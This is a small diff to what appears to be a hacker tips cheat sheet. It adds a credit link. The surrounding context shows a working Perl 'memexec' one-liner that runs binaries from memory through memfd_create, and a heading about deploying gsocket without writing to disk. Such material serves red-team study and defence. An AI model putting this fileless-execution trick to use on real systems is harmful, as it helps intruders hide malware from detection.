@@ -2046,7 +2046,7 @@ The shortest possible variant is (example):
 memexec(){ perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
 # Example: cat /usr/bin/id | memexec -u
 ```
-(Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions)
+(Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)
 
 Deploy gsocket without writing to the filesystem (example):
 ```sh
